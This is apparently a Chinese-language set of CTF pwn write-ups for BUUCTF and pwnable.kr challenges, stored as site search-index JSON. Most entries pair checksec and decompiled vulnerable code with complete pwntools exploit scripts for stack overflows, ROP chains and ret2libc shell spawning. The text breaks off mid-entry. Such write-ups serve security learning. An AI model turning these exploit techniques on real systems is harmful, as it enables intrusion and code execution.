flag{Th1s_is_A_tEst_f1a9}\\n'[*] Stopped process './get_started_3dsctf_2016' (pid 1401) Copy 很顺利地输出了同目录测试用的flag.txt。 改成远程尝试一下 [+] Opening connection to node3.buuoj.cn on port 27349: Doneb'timeout: the monitored command dumped core\\n'[*] Closed connection to node3.buuoj.cn port 27349 Copy timeout了，说明栈没有对齐。那么就是说不能直接跳转到fopen的地方运行获取flag，得换一个法子。那就正常跳转到get_flag，将参数传入试试。 payload就变成了：padding + get_flag_add + get_flag的返回地址 + a1 + a2 因为输出flag后我们不需要做什么了，直接返回到exit就行了。 最终脚本为： from pwn import * is_debug = 1file_name = './get_started_3dsctf_2016'host = 'node3.buuoj.cn'port = 27349 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) get_flag_add = elf.symbols['get_flag'] exit_add = elf.symbols['exit'] a1 = 0x308CD64F a2 = 0x195719D1 payload = b'a' * 0x38 + p32(get_flag_add) + p32(exit_add) + p32(a1) + p32(a2) sh.sendline(payload) print(sh.recvline()) if __name__ == '__main__': main() Copy "},{"title":"rip1","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/rip","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"rip1","url":"BUUCTF/栈溢出/rip#知识点","content":"栈溢出覆盖栈中返回地址 "},{"title":"解题分析","type":1,"pageTitle":"rip1","url":"BUUCTF/栈溢出/rip#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=pwn1RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 64) Symbols No 0 1 pwn1 Copy 拖入ida64分析，main源码如下： int __cdecl main(int argc, const char **argv, const char **envp){ char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\"please input\"); gets(s, argv); puts(s); puts(\"ok,bye!!!\"); return 0;} Copy 由于读入字符串用的是gets，因此存在栈溢出漏洞。 Shift + F12发现字符串/bin/sh，是在函数fun中，该函数地址为0x401186。 计算变量s到返回地址的距离是0x17，使用字符串填充然后用函数fun的地址覆盖返回地址。 脚本如下： from pwn import * is_debug = 1elf = './pwn1'host = 'node3.buuoj.cn'port = 26057 def main(): if is_debug: sh = process(elf) else: sh = remote(host, port) payload = b'a' * 0x17 + p64(0x401186) sh.sendlineafter('\\n', payload) sh.interactive() if __name__ == '__main__': main() Copy 运行结果如下： ┌──(kali㉿kali)-[~/Desktop]└─$ python3 base.py[+] Starting local process './pwn1': pid 2144[*] Switching to interactive modeaaaaaaaaaaaaaaaaaaaaaaa\\x86\\x11ok,bye!!!$ lsbase.py core pwn1$ Copy "},{"title":"jarvisoj_level2_x64","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/jarvisoj_level2_x64","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"jarvisoj_level2_x64","url":"BUUCTF/栈溢出/jarvisoj_level2_x64#知识点","content":"ROP构造栈溢出覆盖返回地址 "},{"title":"解题分析","type":1,"pageTitle":"jarvisoj_level2_x64","url":"BUUCTF/栈溢出/jarvisoj_level2_x64#解题分析","content":"checksec看一下发现开启了堆栈不可执行 ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=level2_x64 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILENo RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 68) Symbols No 0 1level2_x64 Copy 拖入ida64查看，因为main没什么价值就不看了，直接看主要的函数 ssize_t vulnerable_function(){ char buf[128]; // [rsp+0h] [rbp-80h] BYREF system(\"echo Input:\"); return read(0, buf, 0x200uLL);} Copy 很明显的栈溢出，有system函数，Shift + F12也发现了字符串/bin/sh，最终有2个条件： system函数的地址为0x4004C0/bin/sh字符串的地址为0x600A90 没有现成的后门函数，需要自己构造ROP，因为可以直接调用system，用pop rdi; ret就行，用ROPgadget搜索一下符合条件的gadget地址。 ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary level2_x64 --only \"pop|ret\"Gadgets information============================================================0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop r14 ; pop r15 ; ret0x00000000004006b2 : pop r15 ; ret0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400560 : pop rbp ; ret0x00000000004006b3 : pop rdi ; ret0x00000000004006b1 : pop rsi ; pop r15 ; ret0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004a1 : ret Unique gadgets found: 11 Copy 得到gadget地址为0x4006b3 最终得到脚本： from pwn import * is_debug = 0file_name = './level2_x64'host = 'node4.buuoj.cn'port = 27158 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) pop_rdi = 0x4006b3 sys_addr = 0x4004c0 bin_sh = 0x600A90 payload = b'a' * 0x88 + p64(pop_rdi) + p64(bin_sh) +p64(sys_addr) sh.sendlineafter('\\n', payload) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"flag","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/flag","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"flag","url":"Pwnable.kr/Toddlers_Bottle/flag#原题内容","content":"Papa brought me a packed present! let's open it. Download : http://pwnable.kr/bin/flag This is reversing task. all you need is binary Copy "},{"title":"题目分析","type":1,"pageTitle":"flag","url":"Pwnable.kr/Toddlers_Bottle/flag#题目分析","content":"直接给了一个附件，那就是在文件里找flag或者想办法搞到flag了。 用ida-64打开flag，发现只有4个函数，Shift + F12找到关键词//upx.sf.net $\\n，说明该文件使用upx加壳了，那就先脱壳。这边用UPXShell来进行脱壳。点我下载UPXShell 脱壳后再打开，Shift + F12先搜索\"flag\"试试，直接搜到flag。 "},{"title":"2018_rop","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/rop","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"2018_rop","url":"BUUCTF/栈溢出/rop#知识点","content":"ROP构造 "},{"title":"解题分析","type":1,"pageTitle":"2018_rop","url":"BUUCTF/栈溢出/rop#解题分析","content":"checksec，开了NX ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=2018_rop RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 70) Symbols No 012018_rop Copy ida看下，vulnerable_function函数如下 ssize_t vulnerable_function(){ char buf[136]; // [esp+10h] [ebp-88h] BYREF return read(0, buf, 0x100u);} Copy 很明显可以栈溢出，需要0x8c个字符才能覆盖到返回地址，剩下0x74个字符可以让我们构造rop。 由于左侧没有system函数，那就需要泄露函数地址来计算得出。能够用作输出内容的函数只看到了write，而write需要3个参数。 整理以下解题思路如下： 栈溢出调用write函数泄露出write函数的got地址计算出system函数以及字符串/bin/sh地址重新调用main函数再次栈溢出调用system('/bin/sh') ROPgadget搜索以下符合要求的gadget 那么很快就可以得出泄露write函数got地址部分代码如下： write_plt = elf.plt['write']write_got = elf.got['write']pop3_ret = 0x0804855d_start_addr = 0x080483C0payload1 = b'a' * 0x8c + p32(write_plt) + p32(_start_addr)payload1 += p32(1) + p32(write_got) + p32(4) Copy 泄露地址后计算部分代码如下： write_addr = u32(sh.recv(4))libc = LibcSearcher('write', write_addr)libc_base = write_addr - libc.dump('write')sys_addr = libc_base + libc.dump('system')bin_sh_addr = libc_base + libc.dump('str_bin_sh') Copy 调用system('/bin/sh')部分的payload为：payload2 = b'a' * 0x8c + p32(sys_addr) + p32(_start_addr) + p32(bin_sh_addr) 最终得到完整脚本为： from pwn import *from LibcSearcher import * is_debug = 0file_name = './2018_rop'host = 'node4.buuoj.cn'port = 27743 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) write_plt = elf.plt['write'] write_got = elf.got['write'] _start_addr = 0x080483C0 payload1 = b'a' * 0x8c + p32(write_plt) + p32(_start_addr) payload1 += p32(1) + p32(write_got) + p32(4) sh.sendline(payload1) write_addr = u32(sh.recv(4)) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') sys_addr = libc_base + libc.dump('system') bin_sh_addr = libc_base + libc.dump('str_bin_sh') payload2 = b'a' * 0x8c + p32(sys_addr) + p32(_start_addr) + p32(bin_sh_addr) sh.sendline(payload2) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"ciscn_2019_n_5","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/ciscn_2019_n_5","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"ciscn_2019_n_5","url":"BUUCTF/栈溢出/ciscn_2019_n_5#知识点","content":"ROP构造ret2libc "},{"title":"解题分析","type":1,"pageTitle":"ciscn_2019_n_5","url":"BUUCTF/栈溢出/ciscn_2019_n_5#解题分析","content":"checksec查看一下发现没开保护 ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=ciscn_2019_n_5 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 77) Symbols No 0 2ciscn_2019_n_5 Copy 拖入ida64，main函数如下： int __cdecl main(int argc, const char **argv, const char **envp){ char text[30]; // [rsp+0h] [rbp-20h] BYREF setvbuf(stdout, 0LL, 2, 0LL); puts(\"tell me your name\"); read(0, name, 0x64uLL); puts(\"wow~ nice name!\"); puts(\"What do you want to say to me?\"); gets(text); return 0;} Copy 很明显gets可以造成栈溢出，在左侧列表中没找到system函数，需要自己计算出来。又由于name是写到bss段的并且保护一个都没开，因此可以得出以下两种思路。 第一种解题思路如下： 将shellcode写入bss段栈溢出跳转到bss段执行 第二种解题思路如下： 泄露puts函数的地址计算出system函数和字符串/bin/sh的地址重新执行main函数，调用system('/bin/sh') 在ida64中用快捷键Ctrl + S查询到bss段并没有可执行权限，因此采用第二种思路。 ROPgadget搜索结果如下： ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary ciscn_2019_n_5 --only \"pop|ret\"Gadgets information============================================================0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400710 : pop r14 ; pop r15 ; ret0x0000000000400712 : pop r15 ; ret0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400713 : pop rdi ; ret0x0000000000400711 : pop rsi ; pop r15 ; ret0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004c9 : ret0x0000000000400532 : ret 0x200a Copy 第一步泄露puts函数地址的关键代码如下： elf = ELF(file_name)puts_plt = elf.plt['puts']puts_got = elf.got['puts']pop_rdi = 0x400713_start_addr = elf.symbols['_start'] sh.sendlineafter('name', 'ruomo') payload1 = b'a' * 0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)sh.sendlineafter('me?\\n', payload1)puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00')) Copy 第二步计算system函数和字符串/bin/sh地址的关键代码如下： libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')sys_addr = libc_base + libc.dump('system')bin_sh_addr = libc_base + libc.dump('str_bin_sh') Copy 第三步调用关键代码如下： sh.sendlineafter('name', 'ruomo') payload2 = b'a' * 0x28 + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)sh.sendlineafter('me?\\n', payload2) Copy 提示 我本地的libc版本过高，直接本地测试会出现libc版本搜索错误的问题，需要elfpatch后再本地测试。在远程服务器上libc版本为2.27，本地可用glibc-all-in-one工具下载2.27版本的libc再elfpatch。 最终得到python脚本如下： from pwn import *from LibcSearcher import * is_debug = 0file_name = './ciscn_2019_n_5'host = 'node4.buuoj.cn'port = 26568 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] pop_rdi = 0x400713 ret_addr = 0x4004c9 _start_addr = elf.symbols['_start'] sh.sendlineafter('name', 'ruomo') payload1 = b'a' * 0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) sh.sendlineafter('me?\\n', payload1) puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00')) libc = LibcSearcher('puts', puts_addr) libc_base = puts_addr - libc.dump('puts') sys_addr = libc_base + libc.dump('system') bin_sh_addr = libc_base + libc.dump('str_bin_sh') sh.sendlineafter('name', 'ruomo') payload2 = b'a' * 0x28 + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr) sh.sendlineafter('me?\\n', payload2) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"bof","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/bof","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"bof","url":"Pwnable.kr/Toddlers_Bottle/bof#原题内容","content":"Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 Copy "},{"title":"程序源码","type":1,"pageTitle":"bof","url":"Pwnable.kr/Toddlers_Bottle/bof#程序源码","content":"#include <stdio.h>#include <string.h>#include <stdlib.h>void func(int key){ char overflowme[32]; printf(\"overflow me : \"); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(\"/bin/sh\"); } else{ printf(\"Nah..\\n\"); }}int main(int argc, char* argv[]){ func(0xdeadbeef); return 0;} Copy "},{"title":"题目分析","type":1,"pageTitle":"bof","url":"Pwnable.kr/Toddlers_Bottle/bof#题目分析","content":"很基础的一题栈溢出，ida打开查看栈空间如下： -0000002C s db 32 dup(?)-0000000C var_C dd ?-00000008 db ? ; undefined-00000007 db ? ; undefined-00000006 db ? ; undefined-00000005 db ? ; undefined-00000004 db ? ; undefined-00000003 db ? ; undefined-00000002 db ? ; undefined-00000001 db ? ; undefined+00000000 s db 4 dup(?)+00000004 r db 4 dup(?)+00000008 arg_0 dd ? Copy 计算得到填充0x2C + 0x8个字符即可到达arg_0所在位置。 "},{"title":"脚本源码","type":1,"pageTitle":"bof","url":"Pwnable.kr/Toddlers_Bottle/bof#脚本源码","content":"from pwn import * nc = remote('pwnable.kr', 9000)shellcode = b'a' * 52 + p32(0xcafebabe)nc.sendline(shellcode)nc.interactive() Copy "},{"title":"【OGeek2019】babyrop","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/OGeek2019_babyrop","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"【OGeek2019】babyrop","url":"BUUCTF/栈溢出/OGeek2019_babyrop#知识点","content":"libc地址泄露及计算相应地址 "},{"title":"解题分析","type":1,"pageTitle":"【OGeek2019】babyrop","url":"BUUCTF/栈溢出/OGeek2019_babyrop#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=pwnRELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEFull RELRO No canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 3 pwn Copy 拖入ida分析，main源码如下： int __cdecl main(){ int buf; // [esp+4h] [ebp-14h] BYREF char v2; // [esp+Bh] [ebp-Dh] int fd; // [esp+Ch] [ebp-Ch] sub_80486BB(); fd = open(\"/dev/urandom\", 0); if ( fd > 0 ) read(fd, &buf, 4u); v2 = sub_804871F(buf); sub_80487D0(v2); return 0;} Copy 可以看到首先会产生一个随机数，存入到buf里面；接着把buf当作参数传入函数sub_804871F中，将函数的返回值存入v2中；最后将v2作为参数传入sub_80487D0函数中。 看一下sub_804871F的源码： int __cdecl sub_804871F(int a1){ size_t v1; // eax char s[32]; // [esp+Ch] [ebp-4Ch] BYREF char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF ssize_t v5; // [esp+4Ch] [ebp-Ch] memset(s, 0, sizeof(s)); memset(buf, 0, sizeof(buf)); sprintf(s, \"%ld\", a1); v5 = read(0, buf, 0x20u); buf[v5 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, s, v1) ) exit(0); write(1, \"Correct\\n\", 8u); return (unsigned __int8)buf[7];} Copy 从源码中可以看到会先将传入的参数a1转为字符串存到变量s中，接着用户可以输入内容存入buf中，然后把buf和s比较，如果不相等就结束程序，相等就返回buf变量中的第8个字符。 这里存在一个漏洞点，函数使用strncmp进行比较，比较的长度v1是用strlen取得buf的长度，因此可以用\\x00使得v1的值为0绕过strncmp，也就是说我们可以控制main中的v2的值。 接下来看一下sub_80487D0的源码： ssize_t __cdecl sub_80487D0(char a1){ ssize_t result; // eax char buf[231]; // [esp+11h] [ebp-E7h] BYREF if ( a1 == 127 ) result = read(0, buf, 0xC8u); else result = read(0, buf, a1); return result;} Copy 从上述代码可以发现，如果使得a1的值不等于127，就可以任意控制read接受字符串的长度，那就可以利用栈溢出，同时没有找到后门函数，需要自己构造rop。 整理一下思路，大致为： 输入字符串，第一个字符是\\x00绕过和随机数的比较控制buf[7]的值，完成栈溢出泄露write的地址，计算出system函数和/bin/sh的地址重新运行一遍main函数，再次栈溢出，调用system('/bin/sh') 从上述思路可以整理出脚本如下： from pwn import *from LibcSearcher import * is_debug = 1file_name = './pwn'host = 'node3.buuoj.cn'port = 25562 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF('./pwn') write_got = elf.got['write'] write_plt = elf.plt['write'] main_addr = 0x8048825 # write address disclosure payload1 = '\\x00' + '\\xff' * 8 payload2 = b'a' * 0xeb + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) + p32(main_addr) sh.sendline(payload1) sh.sendlineafter('Correct\\n', payload2) write_addr = u32(sh.recv(4)) # system&/bin/sh libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') sys_addr = libc_base + libc.dump('system') bin_sh_addr = libc_base + libc.dump('str_bin_sh') # get shell payload3 = b'a' * 0xeb + p32(sys_addr) + p32(sys_addr) + p32(bin_sh_addr) sh.sendline(payload1) sh.sendlineafter('Correct\\n', payload3) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"warmup_csaw_2016","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/warmup_csaw_2016","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"warmup_csaw_2016","url":"BUUCTF/栈溢出/warmup_csaw_2016#知识点","content":"栈溢出覆盖栈中返回地址 "},{"title":"解题分析","type":1,"pageTitle":"warmup_csaw_2016","url":"BUUCTF/栈溢出/warmup_csaw_2016#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=warmup_csaw_2016 1 ⨯RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH No Symbols No 0 2 warmup_csaw_2016 Copy 拖入ida64分析，main源码如下： __int64 __fastcall main(int a1, char **a2, char **a3){ char s[64]; // [rsp+0h] [rbp-80h] BYREF char v5[64]; // [rsp+40h] [rbp-40h] BYREF write(1, \"-Warm Up-\\n\", 0xAuLL); write(1, \"WOW:\", 4uLL); sprintf(s, \"%p\\n\", sub_40060D); write(1, s, 9uLL); write(1, \">\", 1uLL); return gets(v5);} Copy 依旧是覆盖返回地址的简单栈溢出，在程序运行时会输出\"WOW:\"然后跟上一个地址，该地址是函数sub_40060D的地址，实际上就是0x40060D。 计算v5到返回地址距离为0x48。 脚本如下： from pwn import * is_debug = 1elf = './warmup_csaw_2016'host = 'node3.buuoj.cn'port = 29199 def main(): if is_debug: sh = process(elf) else: sh = remote(host, port) sh.recvline() sys_addr = int((sh.recvuntil('\\n'))[4:-1],16) payload = b'a' * 0x48 + p64(sys_addr) sh.sendlineafter('>', payload) print((sh.recvline()).decode()) if __name__ == '__main__': main() Copy 运行结果如下： ┌──(kali㉿kali)-[~/Desktop]└─$ python3 exp.py[+] Starting local process './warmup_csaw_2016': pid 2875flag{Th1s_is_A_tEst_f1a9} [*] Stopped process './warmup_csaw_2016' (pid 2875) Copy "},{"title":"ciscn_2019_ne_5","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/ciscn_2019_ne_5","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"ciscn_2019_ne_5","url":"BUUCTF/栈溢出/ciscn_2019_ne_5#知识点","content":"栈溢出覆盖返回地址 "},{"title":"解题分析","type":1,"pageTitle":"ciscn_2019_ne_5","url":"BUUCTF/栈溢出/ciscn_2019_ne_5#解题分析","content":"checksec发现开了堆栈不可执行 ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=ciscn_2019_ne_5 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 85) Symbols No 02ciscn_2019_ne_5 Copy 拖入ida中得到main函数 int __cdecl main(int argc, const char **argv, const char **envp){ int result; // eax int v4; // [esp+0h] [ebp-100h] BYREF char src[4]; // [esp+4h] [ebp-FCh] BYREF char v6[124]; // [esp+8h] [ebp-F8h] BYREF char s1[4]; // [esp+84h] [ebp-7Ch] BYREF char v8[96]; // [esp+88h] [ebp-78h] BYREF int *v9; // [esp+F4h] [ebp-Ch] v9 = &argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(v8, 0, sizeof(v8)); *(_DWORD *)src = 48; memset(v6, 0, sizeof(v6)); puts(\"Welcome to use LFS.\"); printf(\"Please input admin password:\"); __isoc99_scanf(\"%100s\", s1); if ( strcmp(s1, \"administrator\") ) { puts(\"Password Error!\"); exit(0); } puts(\"Welcome!\"); puts(\"Input your operation:\"); puts(\"1.Add a log.\"); puts(\"2.Display all logs.\"); puts(\"3.Print all logs.\"); printf(\"0.Exit\\n:\"); __isoc99_scanf(\"%d\", &v4); switch ( v4 ) { case 0: exit(0); return result; case 1: AddLog((int)src); break; case 2: Display(src); break; case 3: Print(); break; case 4: GetFlag(src); break; default: break; } sub_804892B(); return result;} Copy 菜单题，选项1是AddLog，选项2是Display，选项3是Print，隐藏选项4是GetFlag，0就退出程序。 其中函数GetFlag非常可疑，双击进入查看 int __cdecl GetFlag(char *src){ char dest[4]; // [esp+0h] [ebp-48h] BYREF char v3[60]; // [esp+4h] [ebp-44h] BYREF *(_DWORD *)dest = 48; memset(v3, 0, sizeof(v3)); strcpy(dest, src); return printf(\"The flag is your log:%s\\n\", dest);} Copy 该函数逻辑为： 将传入参数复制到dest中打印dest内容 暂时先把这个内容放着，看下其他几个函数。AddLog功能是将输入内容写入src中，Display功能是将src内容输出，Print功能是输出\"Printing......\"。 int __cdecl AddLog(int a1){ printf(\"Please input new log info:\"); return __isoc99_scanf(\"%128s\", a1);} Copy 从以上AddLog反编译出来的源码来看，src最多可以接收128个字符长度的字符串，而在GetFlag函数中，若字符串长度大于72则会造成栈溢出。 观察左侧的函数列表可以发现存在函数system，因此我们可以整理出一个思路： AddLog将payload写入到srcGetFlag栈溢出调用system('/bin/sh') Shift + F12后发现没有字符串/bin/sh，不过看到了字符串fflush，可以取出最后2个字符sh构造出system('sh')也可以获取shell。 字符串sh不论是通过字符串fflush的地址来算还是利用ROPgadget来获取，都可以得到地址为0x080482ea。 note ROPgadget查找字符串sh的命令为：ROPgadget --binary ciscn_2019_ne_5 --string 'sh' 最终python脚本如下： from pwn import * is_debug = 0file_name = './ciscn_2019_ne_5'host = 'node4.buuoj.cn'port = 26299 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) sys_addr = elf.plt['system'] main_addr = elf.symbols['main'] sh_addr = 0x080482ea payload = b'a' * 0x4C + p32(sys_addr) + p32(main_addr) + p32(sh_addr) sh.sendlineafter('password:', 'administrator') sh.sendlineafter('\\n:', '1') sh.sendlineafter('info:', payload) sh.sendlineafter('\\n:', '4') sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"fd","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/fd","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"fd","url":"Pwnable.kr/Toddlers_Bottle/fd#原题内容","content":"Mommy! what is a file descriptor in Linux? * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest) Copy "},{"title":"程序源码","type":1,"pageTitle":"fd","url":"Pwnable.kr/Toddlers_Bottle/fd#程序源码","content":"#include <stdio.h>#include <stdlib.h>#include <string.h>char buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc<2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } Copy "},{"title":"题目分析","type":1,"pageTitle":"fd","url":"Pwnable.kr/Toddlers_Bottle/fd#题目分析","content":"很容易可以看出，如果传入的第一个参数值是0x1234的话我们就可以使得fd=0，这样的话read读入的stdin可以由我们自己输入。 "},{"title":"脚本源码","type":1,"pageTitle":"fd","url":"Pwnable.kr/Toddlers_Bottle/fd#脚本源码","content":"from pwn import * s = ssh(host = 'pwnable.kr', user = 'fd', password = 'guest', port = 2222) process = s.process(['./fd', '4660'])process.sendline('LETMEWIN')process.recvline()flag = (process.recvline()).decode() process.close()s.close() print(\"Flag: {}\".format(flag)) Copy "},{"title":"col","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/col","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"col","url":"Pwnable.kr/Toddlers_Bottle/col#原题内容","content":"Daddy told me about cool MD5 hash collision today.I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Copy "},{"title":"程序源码","type":1,"pageTitle":"col","url":"Pwnable.kr/Toddlers_Bottle/col#程序源码","content":"#include <stdio.h>#include <string.h>unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res;} int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0;} Copy "},{"title":"题目分析","type":1,"pageTitle":"col","url":"Pwnable.kr/Toddlers_Bottle/col#题目分析","content":"这道题会首先检查我们传入的内容是否为20个字符，如果是则传入到函数check_password中。 在字符串传入函数后会被强制转换为整数数组，因此是5个整数，函数接着把5个整数相加然后把和返回。 最后在main中判断这个结果和hashcode的值是否相等。 由于存在\\x00截断，因此不能出现\\x00，使用计算器计算一下得到可以构造的一种可能：0x1DD905E8 + 0x01010101 * 4 "},{"title":"脚本源码","type":1,"pageTitle":"col","url":"Pwnable.kr/Toddlers_Bottle/col#脚本源码","content":"from pwn import * s = ssh(host = 'pwnable.kr', user = 'col', password = 'guest', port = 2222) shellcode = p32(0x1DD905E8) + p32(0x01010101) * 4process = s.process(['./col', shellcode])flag = (process.recvline()).decode() process.close()s.close() print(\"Flag: {}\".format(flag)) Copy "},{"title":"ciscn_2019_c_1","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/ciscn_2019_c_1","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"ciscn_2019_c_1","url":"BUUCTF/栈溢出/ciscn_2019_c_1#知识点","content":"ROP构造libc泄露和计算相应地址 "},{"title":"解题分析","type":1,"pageTitle":"ciscn_2019_c_1","url":"BUUCTF/栈溢出/ciscn_2019_c_1#解题分析","content":"checksec结果： RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 85) Symbols No 0 1 ciscn_2019_c_1 Copy 拖入ida64分析，main函数没有什么价值，就是判断输入内容，1就调用encrypt函数；2就让你自己解密，他不管；3就结束。 唯一可以看的就一个加密函数，代码如下： int encrypt(){ size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\"Input your Plaintext to be encrypted\"); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 >= strlen(s) ) break; if ( s[x] <= 96 || s[x] > 122 ) { if ( s[x] <= 64 || s[x] > 90 ) { if ( s[x] > 47 && s[x] <= 57 ) s[x] ^= 0xFu; } else { s[x] ^= 0xEu; } } else { s[x] ^= 0xDu; } ++x; } puts(\"Ciphertext\"); return puts(s);} Copy 刚进函数，就有一个gets入眼，那么搜索一下危险函数，然而并没有任何发现。那这题就只能自己构造ROP去调用system('/bin/sh')了，这里利用puts函数来计算地址。 首先用ROPgadget搜一下pop rdi ; ret和ret ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary ./ciscn_2019_c_1 --only \"pop|ret\"Gadgets information============================================================0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c80 : pop r14 ; pop r15 ; ret0x0000000000400c82 